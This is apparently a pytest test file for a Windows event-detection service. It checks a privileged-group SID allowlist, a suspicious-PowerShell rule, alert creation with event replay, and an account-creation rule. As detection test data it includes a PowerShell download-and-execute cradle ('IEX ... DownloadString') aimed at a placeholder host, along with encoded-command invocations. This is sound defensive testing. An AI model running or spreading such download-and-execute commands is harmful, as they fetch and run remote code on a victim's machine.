import base64
from datetime import UTC, datetime
from uuid import uuid4

import pytest
from collectors.tests.windows_fixtures import windows_xml
from collectors.windows.parser import normalize
from fastapi.testclient import TestClient

from app.detections.single_event import privileged_group, suspicious_powershell
from app.detections.worker import DetectionWorker
from app.main import create_app

ENCODED = base64.b64encode("Write-Output 'synthetic test'".encode("utf-16-le")).decode()


@pytest.mark.parametrize(
    "sid,expected",
    [
        ("S-1-5-32-544", True),
        ("S-1-5-32-551", True),
        ("S-1-5-21-1-2-3-512", True),
        ("S-1-5-21-1-2-3-519", True),
        ("S-1-5-32-545", False),
        ("S-1-5-21-bad-512", False),
        (None, False),
        ("Administrators", False),
    ],
)
def test_privileged_group_sid_allowlist(sid, expected):
    assert privileged_group(sid) is expected


@pytest.mark.parametrize(
    "process,command,expected",
    [
        ("powershell.exe", f"powershell.exe -NoProfile -EncodedCommand {ENCODED}", True),
        ("C:\\Windows\\powershell.exe", f"powershell.exe -enc '{ENCODED}'", True),
        (
            "pwsh.exe",
            "pwsh -Command \"IEX (New-Object Net.WebClient).DownloadString('https://example.invalid/test')\"",
            True,
        ),
        ("powershell.exe", "powershell -Command Get-Process", False),
        ("powershell.exe", "powershell -Command Write-Output 'IEX DownloadString'", False),
        ("powershell.exe", "powershell -File script.ps1 -enc abcd", False),
        ("powershell.exe", "powershell -enc not!base64", False),
        ("powershell.exe", "powershell -Command # IEX x.DownloadString('test')", False),
        (
            "powershell.exe",
            "powershell -Command (New-Object Net.WebClient).DownloadString('test')",
            False,
        ),
        ("cmd.exe", f"echo powershell -enc {ENCODED}", False),
        ("powershell.exe", None, False),
    ],
)
def test_powershell_indicators_and_ordinary_commands(process, command, expected):
    assert suspicious_powershell(process, command) is expected


@pytest.mark.integration
def test_native_xml_new_rules_evidence_and_replay(
    mongo_repository, collector_headers, analyst_headers
):
    settings, repository = mongo_repository
    endpoint = str(uuid4())
    rows = [
        windows_xml(4720),
        windows_xml(4732),
        windows_xml(
            4688,
            data={
                "NewProcessName": "C:\\Windows\\powershell.exe",
                "CommandLine": f"powershell.exe -enc {ENCODED}",
            },
        ),
        windows_xml(4732, record=101, data={"TargetSid": "S-1-5-32-545"}),
        windows_xml(4688, record=102),
    ]
    events = []
    with TestClient(create_app(settings)) as client:
        for xml in rows:
            event = normalize(xml, endpoint)
            event["timestamp"] = datetime.now(UTC).isoformat()
            events.append(event)
            assert (
                client.post("/api/v1/events", headers=collector_headers, json=event).status_code
                == 201
            )
        worker = DetectionWorker(repository, settings)
        for _ in range(10):
            if not worker.process_one():
                break
        alerts = client.get("/api/v1/alerts", headers=analyst_headers).json()["items"]
        assert {row["rule_id"] for row in alerts} == {
            "WIN-ACCOUNT-001",
            "WIN-GROUP-001",
            "WIN-PS-001",
        }
        assert len(alerts) == 3
        for alert in alerts:
            evidence = client.get(
                f"/api/v1/alerts/{alert['id']}/events", headers=analyst_headers
            ).json()
            assert len(evidence["items"]) == 1 and evidence["missing_event_ids"] == []
        for event in events:
            assert (
                client.post("/api/v1/events", headers=collector_headers, json=event).status_code
                == 200
            )
        assert not worker.process_one()
        assert repository.alerts.collection.count_documents({}) == 3


@pytest.mark.integration
@pytest.mark.parametrize(
    "field,value",
    [("os", "macos"), ("source", "Application"), ("event_type", "other"), ("event_code", 4726)],
)
def test_account_rule_requires_native_context(mongo_repository, payload, field, value):
    from app.models import EventInput

    settings, repository = mongo_repository
    event = {
        **payload,
        "timestamp": datetime.now(UTC),
        "event_type": "account_created",
        "event_code": 4720,
        field: value,
    }
    repository.insert(EventInput.model_validate(event))
    assert DetectionWorker(repository, settings).process_one()
    assert repository.alerts.collection.count_documents({}) == 0
